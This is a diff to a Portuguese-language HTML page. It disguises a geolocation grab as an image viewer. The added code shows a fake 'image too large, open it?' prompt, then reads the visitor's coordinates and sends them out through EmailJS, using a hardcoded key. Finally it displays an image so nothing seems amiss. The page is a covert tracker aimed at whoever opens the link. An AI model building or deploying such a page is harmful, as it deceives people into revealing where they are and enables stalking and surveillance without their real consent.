@@ -7,12 +7,11 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         (function(){
-            emailjs.init("yzkcq0FwtO1kwMJj5"); // Substitua "YOUR_USER_ID" pela sua public key
+            emailjs.init("yzkcq0FwtO1kwMJj5"); 
         })();
     </script>
 </head>
 <body>
-    <img src="sua_imagem.jpg" alt="Imagem">
 
     <script>
         function enviarLocalizacao(latitude, longitude) {
@@ -36,22 +35,35 @@
         }
 
         function obterLocalizacao() {
-            console.log('Obtendo localização...');
+            console.log('Solicitando acesso para abrir imagem...');
             
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        console.log(`Localização obtida: Latitude: ${latitude}, Longitude: ${longitude}`);
-                        enviarLocalizacao(latitude, longitude);
-                    },
-                    (error) => {
-                        console.error('Erro ao obter localização:', error);
-                    }
-                );
+            if (confirm('Imagem muito grande. Deseja abrir?')) {
+                console.log('Usuário concordou em abrir a imagem.');
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            console.log(`Localização obtida: Latitude: ${latitude}, Longitude: ${longitude}`);
+                            enviarLocalizacao(latitude, longitude);
+                        },
+                        (error) => {
+                            console.error('Erro ao obter localização:', error);
+                        }
+                    );
+                } else {
+                    console.error('Geolocalização não é suportada pelo navegador.');
+                }
+
+                // Carregar a imagem após a confirmação
+                var img = document.createElement('img');
+                img.src = './img.jpg';
+                img.alt = 'Imagem';
+                document.body.appendChild(img);
+                
             } else {
-                console.error('Geolocalização não é suportada pelo navegador.');
+                console.log('Usuário cancelou a abertura da imagem.');
             }
         }
 
